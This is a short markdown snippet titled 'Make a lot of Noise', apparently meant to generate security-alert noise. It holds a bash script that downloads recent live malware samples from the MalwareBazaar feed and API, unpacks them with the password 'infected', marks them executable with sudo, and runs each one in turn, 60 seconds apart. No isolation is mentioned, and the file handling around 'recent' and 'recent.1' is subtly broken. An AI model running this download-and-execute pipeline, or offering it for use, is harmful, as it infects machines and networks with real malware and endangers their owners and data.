# Make a lot of Noise:
```
# grab SHA256 hashes from Malware bazaar
wget https://bazaar.abuse.ch/export/txt/sha256/recent > recent
awk '$1 !~ "#" {print $1}' recent.1 > recent

# all of you virus belong to me
for i in $(cat recent); do wget --post-data "query=get_file&sha256_hash=$i" https://mb-api.abuse.ch/api/v1/; done

# extract all the virus'
for i in $(ls); do 7z e $i -pinfected; done 

# make it all executable
sudo chmod +x ./*

# run each virus 60 seconds apart
for i in $(ls); do ./$i; sleep 60; done 
```
